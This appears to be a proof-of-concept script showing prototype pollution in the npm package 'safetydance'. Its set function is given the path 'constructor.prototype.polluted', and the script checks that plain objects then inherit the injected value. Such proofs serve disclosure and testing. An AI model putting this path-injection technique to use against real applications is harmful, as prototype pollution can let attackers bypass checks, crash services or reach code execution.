var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const safetydance = require('safetydance');
obj = {};
console.log({}.polluted);
safetydance.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);